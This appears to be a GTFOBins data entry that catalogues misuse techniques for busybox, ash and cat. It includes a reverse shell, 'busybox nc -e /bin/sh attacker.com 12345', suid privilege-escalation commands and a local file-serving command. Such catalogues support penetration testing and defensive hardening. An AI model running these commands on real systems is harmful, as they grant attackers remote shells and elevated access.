  GTFOBins:
    raw:
      documents:
        busybox:
          comment: BusyBox may contain many utilities, run `busybox --list-full` to check what other binaries
            are supported.
          functions:
            inherit:
            - code: busybox ash
              contexts:
                sudo: null
                unprivileged: null
              from: ash
            - code: busybox cat
              contexts:
                sudo: null
                unprivileged: null
              from: cat
            reverse-shell:
            - code: busybox nc -e /bin/sh attacker.com 12345
              contexts:
                sudo: null
                unprivileged: null
              listener: tcp-server
            upload:
            - code: busybox httpd -f -p 12345 -h .
              comment: This serves files in the local folder via an HTTP server.
              contexts:
                sudo: null
                unprivileged: null
              receiver: http-client
        ash:
          functions:
            file-write:
            - code: ash -c 'echo DATA >/path/to/output-file'
              contexts:
                sudo: null
                suid:
                  code: ash -p -c 'echo DATA >/path/to/output-file'
                unprivileged: null
            shell:
            - code: ash
              contexts:
                sudo: null
                suid:
                  code: ash -p
                unprivileged: null
        cat:
          functions:
            file-read:
            - code: cat /path/to/input-file
              contexts:
                sudo: null
                suid: null
                unprivileged: null
